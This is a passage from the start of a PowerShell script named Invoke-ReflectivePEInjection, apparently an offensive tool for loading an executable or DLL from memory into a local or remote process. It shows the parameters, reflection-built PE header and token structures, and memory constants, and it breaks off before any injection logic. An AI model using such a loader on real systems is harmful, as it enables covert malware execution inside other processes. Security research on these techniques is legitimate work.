function Invoke-ReflectivePEInjection
{

Param(
	[Parameter(Position = 0, Mandatory = $true)]
	[String]
	$PEBytes,
	
	[Parameter(Position = 1)]
 	[String]
	$Func,
	
	[Parameter(Position = 2)]
	[Int32]
	$ProcId,

    [Parameter(Position = 3)]
    [Switch]
    $ForceASLR
)

Set-StrictMode -Version 2

$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$Func,
				
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
		
		
		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType
		
		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType
		
		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
